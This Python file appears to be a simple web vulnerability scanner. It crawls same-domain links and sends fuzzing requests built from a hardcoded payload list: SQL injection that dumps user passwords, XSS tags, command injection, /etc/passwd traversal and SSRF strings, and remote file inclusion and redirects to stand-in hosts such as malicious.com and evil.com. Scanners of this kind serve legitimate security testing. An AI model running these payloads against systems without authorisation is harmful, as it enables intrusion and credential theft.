import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

PAYLOADS = {
    "sql_injection": ["' OR '1'='1", """' UNION SELECT null, username, password FROM users--"""],
    "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"] ,
    "ssrf": ["http://localhost:8080/admin", "file:///etc/passwd"],
    "command_injection": ["; ls -la", "| whoami"],
    "lfi": ["../../../../etc/passwd", "../windows/win.ini"],
    "rfi": ["http://malicious.com/shell.txt"],
    "open_redirect": ["http://evil.com"]
}

class WebCrawler:
    def __init__(self, base_url, max_depth=2):
        self.base_url = base_url
        self.max_depth = max_depth
        self.visited_urls = set()
        self.discovered_urls = set()
        self.headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
            }

    def fetch_urls(self, url, depth=0):
        if depth > self.max_depth or url in self.visited_urls:
            return

        self.visited_urls.add(url)
        try:
            response = requests.get(url, headers=self.headers, timeout=5)
            if response.status_code != 200:
                return
        except requests.RequestException:
            return

        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            full_url = urljoin(url, link['href'])
            if self.is_valid_url(full_url):
                self.discovered_urls.add(full_url)
                self.fetch_urls(full_url, depth + 1)

    def is_valid_url(self, url):
        parsed_url = urlparse(url)
        return parsed_url.netloc == urlparse(self.base_url).netloc

    def start_crawl(self):
        self.fetch_urls(self.base_url)
        return self.discovered_urls

    def send_fuzz_request(self, method='GET', headers=None, params=None, data=None, vulnerability_type=None):
        """Send an HTTP request with different payloads to test vulnerabilities."""
        results = []
        
        if vulnerability_type and vulnerability_type in PAYLOADS:
            payloads = PAYLOADS[vulnerability_type]
        else:
            payloads = [p for pl in PAYLOADS.values() for p in pl]
        
        if not headers: headers = self.headers
        
        for payload in payloads:
            try:
                # Modify params or data with the payload
                mod_params = {k: v + payload for k, v in (params or {}).items()} if params else None
                mod_data = {k: v + payload for k, v in (data or {}).items()} if data else None
                
                response = requests.request(method, self.base_url, headers=headers, params=mod_params, data=mod_data, timeout=5)
                results.append({
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_text": response.text[:500]  # Limit response size for logs
                })
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})
        
        return results

# Example usage:
if __name__ == "__main__":
    target_url = "https://example.com"
    crawler = WebCrawler(target_url, max_depth=2)
    urls = crawler.start_crawl()
    print("Discovered URLs:", urls)
